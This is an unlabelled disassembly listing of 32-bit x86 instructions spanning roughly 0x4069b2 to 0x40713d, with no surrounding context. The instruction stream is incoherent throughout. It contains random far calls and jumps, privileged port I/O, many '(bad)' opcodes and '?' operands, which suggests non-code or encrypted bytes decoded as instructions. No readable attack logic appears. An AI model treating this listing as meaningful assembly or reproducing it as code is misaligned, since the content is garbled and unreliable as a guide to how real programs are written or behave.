  4069b2:	mov    esp,0x31abdf08
  4069b7:	xor    al,0xeb
  4069b9:	imul   esp,DWORD PTR [edx-0x76],0xffffffe6
  4069bd:	ret    0x45ab
  4069c0:	scas   al,BYTE PTR es:[edi]
  4069c1:	fmul   QWORD PTR [ecx+edi*2]
  4069c4:	add    al,0x54
  4069c6:	xchg   esi,eax
  4069c7:	fimul  WORD PTR [edx-0x35]
  4069ca:	mov    ds:0xfccfba11,eax
  4069cf:	les    esp,FWORD PTR [edi-0x69]
  4069d2:	push   ebx
  4069d3:	dec    ecx
  4069d4:	sahf   
  4069d5:	push   edi
  4069d6:	dec    esi
  4069d7:	daa    
  4069d8:	out    0x82,eax
  4069da:	pop    ds
  4069db:	adc    eax,ebp
  4069dd:	mov    bh,0xeb
  4069df:	in     al,dx
  4069e0:	dec    ebp
  4069e1:	jge    0x406a32
  4069e3:	sub    ebx,DWORD PTR [ecx+0x57]
  4069e6:	dec    ebp
  4069e7:	add    al,0x36
  4069e9:	cs dec eax
  4069eb:	fs fmul st(2),st
  4069ee:	jp     0x406a69
  4069f0:	inc    esp
  4069f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069f2:	ins    BYTE PTR es:[edi],dx
  4069f3:	xchg   edx,eax
  4069f4:	mov    ebp,0x29757f33
  4069f9:	dec    eax
  4069fa:	pop    ebp
  4069fb:	cwde   
  4069fc:	clc    
  4069fd:	mov    WORD PTR [ebx],?
  4069ff:	mov    ah,0xa1
  406a01:	mov    ch,0x51
  406a03:	add    eax,0x85c3c4c7
  406a08:	pop    ss
  406a09:	in     eax,dx
  406a0a:	cwde   
  406a0b:	out    dx,eax
  406a0c:	xchg   ecx,eax
  406a0d:	mul    ah
  406a0f:	in     al,dx
  406a10:	shr    DWORD PTR [edx-0x5d794756],1
  406a16:	pop    ds
  406a17:	mov    ah,0xf9
  406a19:	inc    eax
  406a1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a1b:	push   ebp
  406a1c:	or     esi,DWORD PTR [edx]
  406a1e:	out    dx,eax
  406a1f:	xchg   ebp,eax
  406a20:	cmp    bh,BYTE PTR [ebp+0x6b0c0e70]
  406a26:	mov    edi,0x334ca7e
  406a2b:	mov    ch,0xd
  406a2d:	pop    ds
  406a2e:	push   cs
  406a2f:	pushf  
  406a30:	rcr    BYTE PTR [esi+eax*4],cl
  406a33:	cmp    BYTE PTR [eax-0x19f245b8],cl
  406a39:	inc    esp
  406a3a:	ret    0x402a
  406a3d:	sbb    BYTE PTR [edx+eiz*8],0x53
  406a41:	xchg   edx,eax
  406a42:	xchg   esp,eax
  406a43:	dec    edi
  406a44:	(bad)  
  406a45:	jg     0x4069df
  406a47:	mov    DWORD PTR [eax+0x59],edx
  406a4a:	ds (bad) 
  406a4c:	sbb    BYTE PTR [ebx+eiz*4],cl
  406a4f:	out    dx,eax
  406a50:	fcomp  st(4)
  406a52:	test   eax,0xc9d74b53
  406a57:	pusha  
  406a58:	and    esi,ecx
  406a5a:	inc    eax
  406a5b:	mov    ds:0x762501a7,al
  406a60:	lds    ebx,FWORD PTR [eax-0x53768077]
  406a66:	push   esi
  406a67:	(bad)  
  406a68:	mov    ds:0xf4d080a8,eax
  406a6d:	ins    BYTE PTR es:[edi],dx
  406a6e:	push   ds
  406a6f:	int    0x8b
  406a71:	mov    ch,0x6e
  406a73:	dec    esi
  406a74:	ja     0x406ad6
  406a76:	sub    dh,BYTE PTR [esi+0x3f314dee]
  406a7c:	push   esp
  406a7d:	cmp    esi,ebp
  406a7f:	jno    0x406a72
  406a81:	cld    
  406a82:	or     al,0x14
  406a84:	test   BYTE PTR [ebx],ah
  406a86:	out    dx,al
  406a87:	test   eax,0x515f95d6
  406a8c:	or     ebp,ecx
  406a8e:	call   0x25ee7418
  406a93:	sbb    eax,0x8c5848a9
  406a98:	sub    al,0xd5
  406a9a:	cmp    bh,BYTE PTR [ecx]
  406a9c:	xor    al,0xf3
  406a9e:	xor    eax,0x18129b07
  406aa3:	(bad)  
  406aa4:	pop    ds
  406aa5:	sbb    BYTE PTR [edi+0x43],bl
  406aa8:	retf   
  406aa9:	cmc    
  406aaa:	and    DWORD PTR [ecx],ecx
  406aac:	sub    esi,esp
  406aae:	sub    al,0x25
  406ab0:	es dec ebp
  406ab2:	dec    ebx
  406ab3:	and    bh,BYTE PTR [esi+ecx*8+0x1c]
  406ab7:	adc    al,0x55
  406ab9:	test   al,0x38
  406abb:	fnstsw WORD PTR [esi]
  406abd:	mov    ds:0x19b6a63e,eax
  406ac2:	adc    eax,0xb83faca6
  406ac7:	out    dx,al
  406ac8:	mov    ebx,0x6dc9f3b4
  406acd:	mov    ds:0x6ce89a0f,al
  406ad2:	fst    DWORD PTR [esi]
  406ad4:	hlt    
  406ad5:	shl    BYTE PTR [esi],cl
  406ad7:	push   ecx
  406ad8:	xor    BYTE PTR [esi+0x1e58ee72],bl
  406ade:	cwde   
  406adf:	dec    ebp
  406ae0:	in     al,dx
  406ae1:	stos   BYTE PTR es:[edi],al
  406ae2:	or     al,BYTE PTR [edi-0xd]
  406ae5:	pushf  
  406ae6:	xchg   ecx,esi
  406ae8:	inc    ecx
  406ae9:	sbb    edx,DWORD PTR [ebx+0x70]
  406aec:	scas   al,BYTE PTR es:[edi]
  406aed:	sub    ah,BYTE PTR [edx-0x1a8bae1c]
  406af3:	sbb    esi,ecx
  406af5:	and    ebx,DWORD PTR [ebp-0xe716f84]
  406afb:	push   ebx
  406afc:	adc    ch,BYTE PTR [edi-0x58c0bbab]
  406b02:	lods   eax,DWORD PTR ds:[esi]
  406b03:	sub    ch,cl
  406b05:	jg     0x406b4f
  406b07:	into   
  406b08:	mov    dh,BYTE PTR [edi]
  406b0a:	sub    esp,esp
  406b0c:	xor    eax,0x85b8f539
  406b11:	retf   
  406b12:	jo     0x406b69
  406b14:	mov    DWORD PTR [ebp+0x420af007],edi
  406b1a:	loopne 0x406b1b
  406b1c:	push   di
  406b1e:	dec    esi
  406b1f:	into   
  406b20:	mov    al,ds:0xcff84fcf
  406b25:	mov    ebx,0x39783ee7
  406b2a:	retf   
  406b2b:	sbb    al,0x7b
  406b2d:	inc    ebp
  406b2e:	mov    edi,DWORD PTR [ebx+0x62e2218b]
  406b34:	mov    dh,0x71
  406b36:	dec    ecx
  406b37:	xor    al,0x22
  406b39:	fisubr DWORD PTR [edi-0x4713edf1]
  406b3f:	mov    edi,0x33ecf352
  406b44:	daa    
  406b45:	or     eax,edi
  406b47:	push   cs
  406b48:	arpl   WORD PTR [edx-0xe],cx
  406b4b:	mov    eax,0x6a12a9e4
  406b50:	fs inc edi
  406b52:	aaa    
  406b53:	cs add eax,0xfc897039
  406b59:	sub    cl,BYTE PTR [ebx-0x1a21a34c]
  406b5f:	add    DWORD PTR [edi],0x5c
  406b62:	push   ecx
  406b63:	popa   
  406b64:	ret    0xccaf
  406b67:	mov    ?,esp
  406b69:	sbb    ecx,DWORD PTR [edx+0x5f]
  406b6c:	stc    
  406b6d:	xchg   edx,eax
  406b6e:	call   0x707e:0xbb613b03
  406b75:	clc    
  406b76:	xchg   esi,eax
  406b77:	das    
  406b78:	add    al,0xd3
  406b7a:	xor    eax,0x7ede160d
  406b7f:	push   edx
  406b80:	xchg   ebp,eax
  406b81:	xchg   ebp,eax
  406b82:	inc    ebx
  406b83:	dec    edx
  406b84:	bound  esi,QWORD PTR [edx]
  406b86:	std    
  406b87:	jb     0x406b1f
  406b89:	mov    esp,0xccbea0af
  406b8e:	imul   DWORD PTR [ebx+0x59eec0fa]
  406b94:	jmp    0x406bf8
  406b96:	mov    edi,0x8ab30f29
  406b9b:	xchg   DWORD PTR [edx-0x6d],ecx
  406b9e:	out    0x10,al
  406ba0:	pop    ebx
  406ba1:	push   esp
  406ba2:	or     bl,bl
  406ba4:	mov    eax,ds:0x56a230bb
  406ba9:	cs inc ebx
  406bab:	adc    al,0x34
  406bad:	push   ebx
  406bae:	shl    BYTE PTR [esi],1
  406bb0:	jl     0x406bc3
  406bb2:	mov    ah,0x4b
  406bb4:	aaa    
  406bb5:	(bad)  
  406bb6:	out    0x88,al
  406bb8:	or     al,0x5
  406bba:	call   0xea06:0x2332bfd8
  406bc1:	push   0xba502f4
  406bc6:	rcl    dl,0x95
  406bc9:	les    ebx,FWORD PTR [eax-0x3b43cace]
  406bcf:	pop    edi
  406bd0:	test   al,0x26
  406bd2:	dec    edi
  406bd3:	and    al,BYTE PTR [edx+0x71d27259]
  406bd9:	lods   eax,DWORD PTR ds:[esi]
  406bda:	adc    ebp,DWORD PTR [edi-0x38]
  406bdd:	push   cs
  406bde:	jne    0x406b92
  406be0:	clts   
  406be2:	shr    BYTE PTR [eax],1
  406be4:	mov    cl,0xb3
  406be6:	aas    
  406be7:	icebp  
  406be8:	rol    BYTE PTR [ebp-0xd],1
  406beb:	mov    ebx,0x89328c3
  406bf0:	fmul   DWORD PTR [ebp+ebp*2-0x49cf0423]
  406bf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bf8:	pop    ebp
  406bf9:	je     0x406bd0
  406bfb:	lahf   
  406bfc:	push   es
  406bfd:	pop    ebx
  406bfe:	js     0x406c5e
  406c00:	push   0x7ea0b864
  406c05:	xor    DWORD PTR [edx],ebp
  406c07:	iret   
  406c08:	(bad)  
  406c0a:	cmp    ch,BYTE PTR [ecx]
  406c0c:	jno    0x406c75
  406c0e:	shl    DWORD PTR [edi+ebp*1-0x77b07864],1
  406c15:	rep lods al,BYTE PTR ds:[esi]
  406c17:	ins    DWORD PTR es:[edi],dx
  406c18:	iret   
  406c19:	iret   
  406c1a:	cs adc al,0xc4
  406c1d:	add    bh,BYTE PTR [ebp+0x2da7bc4d]
  406c23:	mov    edi,0xfa0683de
  406c28:	or     BYTE PTR [ecx+0x3c],0xb5
  406c2c:	push   ebp
  406c2d:	adc    ch,al
  406c2f:	cmp    al,0xa7
  406c31:	out    0xc1,al
  406c33:	mov    ds:0x79756783,eax
  406c38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c39:	shr    esp,1
  406c3b:	cmc    
  406c3c:	fldenv ds:0x807fc52a
  406c42:	(bad)  
  406c43:	cmp    eax,0x3da0a29a
  406c48:	aam    0x58
  406c4a:	leave  
  406c4b:	push   sp
  406c4d:	aad    0x5c
  406c4f:	(bad)  
  406c50:	mov    al,ds:0xa5615e80
  406c55:	retf   
  406c56:	es es sbb eax,0x68175c2c
  406c5d:	jbe    0x406c36
  406c5f:	push   ss
  406c60:	js     0x406c8a
  406c62:	and    BYTE PTR [ecx],cl
  406c64:	out    0x5f,eax
  406c66:	mov    bl,0xae
  406c68:	popf   
  406c69:	icebp  
  406c6a:	sub    esi,ebx
  406c6c:	mov    bh,0x5a
  406c6e:	fld    DWORD PTR [esi]
  406c70:	mov    bl,0x5a
  406c72:	jmp    0x406c88
  406c74:	pop    ebp
  406c75:	lods   eax,DWORD PTR ds:[esi]
  406c76:	int    0x8c
  406c78:	or     al,0x1
  406c7a:	add    DWORD PTR [eax+ebx*2+0x14],esi
  406c7e:	jb     0x406ca7
  406c80:	test   BYTE PTR [ecx],dh
  406c82:	push   esp
  406c83:	push   edi
  406c84:	repnz mov dl,0x2d
  406c87:	xchg   ebx,eax
  406c88:	sbb    edx,DWORD PTR [edi+edi*4]
  406c8b:	in     al,0xb1
  406c8d:	pop    eax
  406c8e:	mov    edi,0x8d1b1afc
  406c93:	loop   0x406c88
  406c95:	cli    
  406c96:	lds    ebp,FWORD PTR [edx]
  406c98:	pop    edi
  406c99:	mov    ecx,0x830e081a
  406c9e:	cld    
  406c9f:	xchg   edi,eax
  406ca0:	xchg   edi,eax
  406ca1:	sbb    bl,bh
  406ca3:	inc    esi
  406ca4:	adc    DWORD PTR ds:[ebp+0x49],edx
  406ca8:	mov    bl,0x53
  406caa:	shr    DWORD PTR [edx-0x68],0xa0
  406cae:	and    al,0x9
  406cb0:	xchg   esi,eax
  406cb1:	mov    ah,0xb3
  406cb3:	mov    ebx,0x2cb77dbd
  406cb8:	fwait
  406cb9:	and    DWORD PTR [ebx],esi
  406cbb:	inc    esp
  406cbc:	mov    cl,0x59
  406cbe:	cli    
  406cbf:	inc    ebx
  406cc0:	adc    al,0x1a
  406cc2:	arpl   WORD PTR [edx-0x1a],si
  406cc5:	test   eax,0x34b943f0
  406cca:	imul   ecx,DWORD PTR [ecx-0x7a],0xffffffa5
  406cce:	test   al,0x9e
  406cd0:	cmp    al,0xf3
  406cd2:	imul   ecx,esi,0xd6e81e77
  406cd8:	test   ecx,ebp
  406cda:	dec    ebx
  406cdb:	push   es
  406cdc:	push   ecx
  406cdd:	add    eax,0x216082c5
  406ce2:	push   ds
  406ce3:	mov    ch,0x72
  406ce5:	into   
  406ce6:	jo     0x406cc6
  406ce8:	(bad)
  406cec:	rol    BYTE PTR [edx],1
  406cee:	in     eax,0xc0
  406cf0:	pop    eax
  406cf1:	je     0x406d6b
  406cf3:	mov    esp,0xa73cdd3a
  406cf8:	jecxz  0x406d3a
  406cfa:	out    dx,eax
  406cfb:	ficomp WORD PTR [edi-0x6735281]
  406d01:	addr16 leave 
  406d03:	imul   eax,DWORD PTR [ecx+0x2bce2b45],0xcc24d000
  406d0d:	(bad)  
  406d0e:	clc    
  406d0f:	fbld   TBYTE PTR [edi]
  406d11:	das    
  406d12:	xor    al,BYTE PTR [ebp-0x6c3821c7]
  406d18:	outs   dx,BYTE PTR ds:[esi]
  406d19:	jo     0x406cc3
  406d1b:	shl    BYTE PTR [ebp+0x5],1
  406d1e:	pop    esp
  406d1f:	aaa    
  406d20:	clc    
  406d21:	jbe    0x406da2
  406d23:	sahf   
  406d24:	jns    0x406d65
  406d26:	mov    ?,WORD PTR [ecx-0x7e523abe]
  406d2c:	pop    esi
  406d2d:	fidiv  WORD PTR [esp+eax*4+0xb]
  406d31:	test   eax,0x44f57e21
  406d36:	jae    0x406d7e
  406d38:	ss jb  0x406d2a
  406d3b:	call   0xcc42:0x530e0437
  406d42:	stos   DWORD PTR es:[edi],eax
  406d43:	ret    0x71b2
  406d46:	push   es
  406d47:	mov    eax,ds:0x1250b947
  406d4c:	cli    
  406d4d:	adc    DWORD PTR [esi-0x46],ebx
  406d50:	ret    0xa0ac
  406d53:	push   eax
  406d54:	or     dl,BYTE PTR [edi+eax*4-0x37]
  406d58:	retf   
  406d59:	nop
  406d5a:	(bad)  
  406d5b:	sub    DWORD PTR [esi+0x48],edi
  406d5e:	jmp    0xdfcf8c20
  406d63:	jg     0x406d63
  406d65:	(bad)  
  406d67:	out    0xc1,eax
  406d69:	jge    0x406d89
  406d6b:	dec    ebp
  406d6c:	test   eax,0xd99f80c9
  406d71:	jnp    0x406dc7
  406d73:	mul    DWORD PTR [ecx-0x60]
  406d76:	sub    BYTE PTR [ebx+0x4669d46b],0x9d
  406d7d:	and    ebp,ebx
  406d7f:	sar    bl,0x77
  406d82:	push   ebx
  406d83:	out    0xaf,eax
  406d85:	pop    ss
  406d86:	icebp  
  406d87:	ja     0x406d5e
  406d89:	jg     0x406d30
  406d8b:	xchg   edx,eax
  406d8c:	jmp    0xe3bd1b44
  406d91:	pop    edx
  406d92:	out    dx,al
  406d93:	stos   BYTE PTR es:[edi],al
  406d94:	cmp    dh,BYTE PTR [ecx]
  406d96:	xlat   BYTE PTR ds:[ebx]
  406d97:	push   ss
  406d98:	mov    eax,0x65b43457
  406d9d:	mov    al,ds:0xd6a9a150
  406da2:	mov    bh,0xf6
  406da4:	(bad)  
  406da5:	sub    esi,edx
  406da7:	dec    edi
  406da8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406da9:	call   0xf4e6a2f9
  406dae:	and    BYTE PTR ds:0x98d2c6f5,dh
  406db4:	imul   bl
  406db6:	loope  0x406e35
  406db8:	call   0x8e35c907
  406dbd:	mov    edx,esp
  406dbf:	push   ebx
  406dc0:	sbb    BYTE PTR [edi],cl
  406dc2:	push   ss
  406dc3:	mov    al,al
  406dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dc6:	lods   eax,DWORD PTR ds:[esi]
  406dc7:	test   al,0x44
  406dc9:	jmp    0x4d7a:0xb725fb61
  406dd0:	or     DWORD PTR [esi+0x46],0x48ccd3cc
  406dd7:	(bad)  
  406dd8:	mov    ah,0xfb
  406dda:	sbb    eax,0xfd7bbb13
  406ddf:	push   ds
  406de0:	lahf   
  406de1:	dec    ecx
  406de2:	xchg   ebp,eax
  406de3:	inc    edi
  406de4:	jb     0x406d87
  406de6:	mov    DWORD PTR [edi+eiz*2-0x28ea52d4],esp
  406ded:	call   0xdaf04bb8
  406df2:	stos   DWORD PTR es:[edi],eax
  406df3:	or     BYTE PTR [edi+0x4a66c53b],0xf4
  406dfa:	test   al,0x32
  406dfc:	adc    BYTE PTR [eax+edi*2-0x1f],0xcc
  406e01:	cmp    esp,DWORD PTR [ebp+0x47784d6d]
  406e07:	mov    ds:0xb757a2e0,eax
  406e0c:	push   cs
  406e0d:	xchg   ebx,eax
  406e0e:	adc    esp,DWORD PTR [ebx]
  406e10:	fwait
  406e11:	out    0xdb,al
  406e13:	ins    BYTE PTR es:[edi],dx
  406e14:	out    dx,eax
  406e15:	mov    esp,0xe43bda35
  406e1a:	sbb    eax,0x84cafeef
  406e1f:	inc    eax
  406e20:	inc    esp
  406e21:	sti    
  406e22:	push   0x46367a2e
  406e27:	xchg   esi,eax
  406e28:	cmp    DWORD PTR [esi],ebx
  406e2a:	sub    bl,dl
  406e2c:	pop    ebp
  406e2d:	and    al,0x7f
  406e2f:	mov    ah,0x5
  406e31:	icebp  
  406e32:	shl    DWORD PTR [ebx-0x3b1f712c],1
  406e38:	pop    ebx
  406e39:	jmp    0x6bf8d18a
  406e3e:	jge    0x406e1d
  406e40:	or     al,0x26
  406e42:	in     eax,dx
  406e43:	sbb    dl,BYTE PTR [edi-0x7e]
  406e46:	gs out 0x1,eax
  406e49:	aam    0xa4
  406e4b:	jecxz  0x406ec4
  406e4d:	xchg   DWORD PTR [ebx-0x5da4e996],ebp
  406e53:	sbb    eax,esi
  406e55:	idiv   BYTE PTR [eax-0x2]
  406e58:	pop    edi
  406e59:	mov    ecx,DWORD PTR [edi-0x4642293f]
  406e5f:	into   
  406e60:	scas   al,BYTE PTR es:[edi]
  406e61:	xlat   BYTE PTR ds:[ebx]
  406e62:	pop    ebx
  406e63:	inc    eax
  406e64:	inc    ebp
  406e65:	xor    dh,bh
  406e67:	inc    ebx
  406e68:	enter  0xf28e,0x91
  406e6c:	popf   
  406e6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e6e:	xor    ebp,DWORD PTR [ebp-0x2822f376]
  406e74:	jmp    FWORD PTR [esi-0x64]
  406e77:	iret   
  406e78:	jbe    0x406e2a
  406e7a:	retf   0x78bb
  406e7d:	jl     0x406e76
  406e7f:	adc    al,0xba
  406e81:	mov    bl,0x6c
  406e83:	push   edx
  406e84:	push   ss
  406e85:	je     0x406ef3
  406e87:	mov    ds:0x7252aaec,eax
  406e8c:	retf   
  406e8d:	dec    ebp
  406e8e:	mov    cl,0x76
  406e90:	pop    eax
  406e91:	push   0xa9324c5
  406e96:	leave  
  406e97:	sub    BYTE PTR [ebx-0x2cadd59c],0x98
  406e9e:	dec    edi
  406e9f:	jecxz  0x406ef5
  406ea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ea2:	mov    bl,0x31
  406ea4:	mov    eax,ebp
  406ea6:	sub    eax,0x9d01be8e
  406eab:	dec    ebx
  406eac:	int3   
  406ead:	xchg   edi,eax
  406eae:	sahf   
  406eaf:	retf   0xc4f
  406eb2:	sub    edi,esp
  406eb4:	cdq    
  406eb5:	es test al,0x56
  406eb8:	in     al,dx
  406eb9:	test   bl,cl
  406ebb:	fwait
  406ebc:	pop    esp
  406ebd:	sub    al,0x1e
  406ebf:	jns    0x406e8f
  406ec1:	dec    ecx
  406ec2:	scas   al,BYTE PTR es:[edi]
  406ec3:	inc    edx
  406ec4:	push   0xdedb21e7
  406ec9:	cs ret 
  406ecb:	sub    al,0xb7
  406ecd:	arpl   di,bx
  406ecf:	(bad)  
  406ed0:	out    0x24,eax
  406ed2:	popf   
  406ed3:	adc    eax,0xbd6114ad
  406ed8:	dec    edx
  406ed9:	mov    dl,0x6a
  406edb:	push   cs
  406edc:	xor    al,0x71
  406ede:	xchg   ecx,eax
  406edf:	pop    ss
  406ee0:	sbb    edi,DWORD PTR [ecx-0x34f34d12]
  406ee6:	jb     0x406f12
  406ee8:	imul   ecx,ebp,0x288ca237
  406eee:	add    ecx,edx
  406ef0:	loopne 0x406e77
  406ef2:	xchg   ebx,eax
  406ef3:	in     eax,0x85
  406ef5:	adc    eax,DWORD PTR [esi-0x2f]
  406ef8:	ja     0x406e9c
  406efa:	outs   dx,DWORD PTR ds:[esi]
  406efb:	in     al,0xb3
  406efd:	lods   eax,DWORD PTR ds:[esi]
  406efe:	ret    0xa764
  406f01:	inc    ecx
  406f02:	inc    esp
  406f03:	pop    esi
  406f04:	hlt    
  406f05:	inc    esp
  406f06:	hlt    
  406f07:	rcl    DWORD PTR [ecx-0x675228ab],1
  406f0d:	aaa    
  406f0e:	sub    DWORD PTR [ebx],ecx
  406f10:	add    al,0xb9
  406f12:	aam    0x41
  406f14:	fmul   QWORD PTR [ebx+0x58]
  406f17:	push   ebx
  406f18:	ins    BYTE PTR es:[edi],dx
  406f19:	mov    ebp,0xef6f9b05
  406f1e:	mov    WORD PTR [ebx-0x26],ds
  406f21:	jae    0x406f00
  406f23:	push   cs
  406f24:	cmp    BYTE PTR [esi+0x6d],al
  406f27:	mov    esi,0xd3bdc1d1
  406f2c:	push   0x8018bfae
  406f31:	jmp    0x1556:0xf1999fd7
  406f38:	mov    al,ds:0xe4a18b81
  406f3d:	mov    dl,0xe7
  406f3f:	sbb    eax,0xf3183f4e
  406f44:	xchg   ecx,eax
  406f45:	xor    DWORD PTR [eax],edx
  406f47:	out    dx,al
  406f48:	call   0xb2bacddd
  406f4d:	jmp    0xceaf:0xbe68eb32
  406f54:	mov    esp,esp
  406f56:	or     eax,0x5c9d6eda
  406f5b:	lea    edx,[esi-0x1e]
  406f5e:	push   es
  406f5f:	iret   
  406f60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f61:	test   DWORD PTR [edi],esp
  406f63:	push   cs
  406f64:	ja     0x406f8e
  406f66:	lods   eax,DWORD PTR ds:[esi]
  406f67:	ins    DWORD PTR es:[edi],dx
  406f68:	mov    BYTE PTR [ebx+0x23],cl
  406f6b:	dec    ecx
  406f6c:	shl    DWORD PTR [esi-0x33],1
  406f6f:	add    DWORD PTR [esi-0x31],ebp
  406f72:	jmp    0xc10e2510
  406f77:	and    ebx,DWORD PTR [ebx+esi*4-0x6]
  406f7b:	fld    st(4)
  406f7d:	push   edx
  406f7e:	mov    cl,0xa9
  406f80:	arpl   WORD PTR [esi+0x26f29770],si
  406f86:	lods   al,BYTE PTR ds:[esi]
  406f87:	into   
  406f88:	push   edx
  406f89:	iret   
  406f8a:	jl     0x406f99
  406f8c:	jp     0x406f5a
  406f8e:	jns    0x406f6f
  406f90:	mov    esp,0xeece15c6
  406f95:	sub    DWORD PTR [eax-0x58b28041],ecx
  406f9b:	push   edi
  406f9c:	add    ah,cl
  406f9e:	mov    eax,0x97ce40a
  406fa3:	js     0x406ff9
  406fa5:	icebp  
  406fa6:	mov    bh,0x78
  406fa8:	cmp    dh,BYTE PTR [ebx-0x17485d7e]
  406fae:	out    dx,al
  406faf:	imul   ecx,esi,0xffffff8c
  406fb2:	addr16 or al,0x89
  406fb5:	cmp    bl,BYTE PTR [ecx-0x2a9e7f63]
  406fbb:	stos   DWORD PTR es:[edi],eax
  406fbc:	sbb    bh,cl
  406fbe:	xchg   bh,cl
  406fc0:	jnp    0x406fbe
  406fc2:	pushf  
  406fc3:	in     eax,dx
  406fc4:	jecxz  0x406f95
  406fc6:	xor    DWORD PTR [edi-0x6d01c3ea],eax
  406fcc:	in     eax,0xec
  406fce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fcf:	std    
  406fd0:	aad    0x32
  406fd2:	xchg   esp,eax
  406fd3:	cld    
  406fd4:	add    DWORD PTR [esi],eax
  406fd6:	adc    ch,ah
  406fd8:	leave  
  406fd9:	ss nop
  406fdb:	jl     0x406fb2
  406fdd:	ins    DWORD PTR es:[edi],dx
  406fde:	lahf   
  406fdf:	loopne 0x406fb9
  406fe1:	hlt    
  406fe2:	jae    0x407018
  406fe4:	je     0x406f78
  406fe6:	pop    esp
  406fe7:	cmp    DWORD PTR [edi-0x4a],ebp
  406fea:	in     al,0xc0
  406fec:	leave  
  406fed:	cmp    edx,DWORD PTR [edi]
  406fef:	ror    al,0x1
  406ff2:	ss jb  0x406ffb
  406ff5:	adc    DWORD PTR gs:[eax+0x2d773f71],0x78
  406ffd:	pop    ebp
  406ffe:	add    DWORD PTR [eax+0x3b],ecx
  407001:	jb     0x407037
  407003:	adc    al,0x68
  407005:	outs   dx,BYTE PTR ds:[esi]
  407006:	xor    al,0x7b
  407008:	mov    ch,0x1f
  40700a:	mov    edx,0x3a3288df
  40700f:	aad    0x8a
  407011:	xchg   esi,eax
  407012:	cmp    dl,BYTE PTR [ebx]
  407014:	push   ecx
  407015:	mul    ecx
  407017:	cmp    eax,0x1e28999a
  40701c:	psubd  mm3,QWORD PTR [esi-0x5eaa04f]
  407023:	jp     0x406fa8
  407025:	lock push es
  407027:	xor    DWORD PTR [edi-0xd],edx
  40702a:	nop
  40702b:	(bad)  
  40702c:	adc    BYTE PTR [ebp-0x21],cl
  40702f:	mov    dl,0x4a
  407031:	adc    al,0x22
  407033:	enter  0xac1e,0x1a
  407037:	neg    bh
  407039:	call   0xb708:0x4a44e36
  407040:	dec    edx
  407041:	and    eax,0x700b82c0
  407046:	jge    0x407009
  407048:	or     BYTE PTR [eax],0x8c
  40704b:	ret    
  40704c:	outs   dx,DWORD PTR ds:[esi]
  40704d:	stos   BYTE PTR es:[edi],al
  40704e:	iret   
  40704f:	loope  0x407061
  407051:	mov    esp,0xff302e7b
  407056:	xchg   edx,eax
  407057:	inc    esp
  407058:	or     ch,BYTE PTR [esp+esi*2-0x2e4540b2]
  40705f:	add    BYTE PTR [ebx+0x52b0692a],cl
  407065:	xchg   edx,eax
  407066:	sbb    al,BYTE PTR [ecx-0x53]
  407069:	cmp    BYTE PTR [esi+0x6573f984],dl
  40706f:	rcl    BYTE PTR [ebp+0x0],cl
  407072:	ins    BYTE PTR es:[edi],dx
  407073:	call   FWORD PTR [eax-0x7c]
  407076:	mov    BYTE PTR [edi],cl
  407078:	jmp    0x4070ab
  40707a:	stos   DWORD PTR es:[edi],eax
  40707b:	ftst   
  40707d:	jge    0x407082
  40707f:	mov    BYTE PTR [edi-0x7375a2e8],al
  407085:	inc    ebx
  407086:	(bad)  
  407087:	and    al,BYTE PTR [esi-0x48]
  40708a:	dec    edx
  40708b:	sub    BYTE PTR [ebx+0x21],ch
  40708e:	aaa    
  40708f:	cmp    al,0x8a
  407091:	les    edx,FWORD PTR [ecx-0x1e5b3d91]
  407097:	jb     0x4070e1
  407099:	xlat   BYTE PTR ds:[ebx]
  40709a:	push   esi
  40709b:	mov    eax,ds:0xba3b3d9
  4070a0:	(bad)  
  4070a1:	int    0x8b
  4070a3:	out    dx,al
  4070a4:	inc    edx
  4070a5:	xchg   ebp,eax
  4070a6:	rcl    DWORD PTR [edi+0x5],0x53
  4070aa:	mov    edi,?
  4070ac:	sub    dl,BYTE PTR [eax+0xc]
  4070af:	add    al,0xc2
  4070b1:	imul   edx,ebx,0x3
  4070b4:	iret   
  4070b5:	test   al,0x21
  4070b7:	fs test ah,dh
  4070ba:	div    BYTE PTR [ebx]
  4070bc:	icebp  
  4070bd:	scas   al,BYTE PTR es:[edi]
  4070be:	sti    
  4070bf:	add    DWORD PTR [edi+0x18273226],esp
  4070c5:	mov    al,0xa3
  4070c7:	mov    ebx,0xebf5e5b3
  4070cc:	mov    esi,DWORD PTR [ebx]
  4070ce:	add    edi,edx
  4070d0:	dec    edx
  4070d1:	adc    al,0x3e
  4070d3:	gs ja  0x407096
  4070d6:	jg     0x40707d
  4070d8:	das    
  4070d9:	cli    
  4070da:	dec    esi
  4070db:	jo     0x40706b
  4070dd:	jne    0x407127
  4070df:	and    ecx,ebx
  4070e1:	out    0xc3,al
  4070e3:	jbe    0x407110
  4070e5:	xchg   ebp,eax
  4070e6:	ret    
  4070e7:	bound  ebx,QWORD PTR [ebx-0x14b2747a]
  4070ed:	jo     0x407124
  4070ef:	fmul   QWORD PTR cs:[esi+0x31]
  4070f3:	fnstcw WORD PTR [ebp+0x6171c27d]
  4070f9:	jmp    0x4070ec
  4070fb:	mov    ecx,0xa0f3ff4
  407100:	and    eax,0xbdf2d6e1
  407105:	add    al,BYTE PTR [edx-0x59]
  407108:	cmp    eax,0xb9cdc730
  40710d:	mov    eax,0xb12679e6
  407112:	inc    edi
  407113:	inc    edx
  407114:	push   ds
  407115:	jg     0x4070bd
  407117:	cmp    BYTE PTR [eax-0x3b],bl
  40711a:	(bad)  
  40711b:	loopne 0x40715f
  40711d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40711e:	dec    ebp
  40711f:	add    BYTE PTR [edi-0x1edce798],cl
  407125:	pusha  
  407126:	imul   ecx,DWORD PTR [esi+0x1dc7cc50],0xffffff99
  40712d:	push   esi
  40712e:	dec    ebp
  40712f:	or     ebp,ebp
  407131:	adc    ebx,DWORD PTR [edx+edi*1+0x22]
  407135:	test   al,0xf0
  407137:	fwait
  407138:	mov    al,ds:0x621a4ea0
  40713d:	lods   al,BYTE PTR ds:[esi]
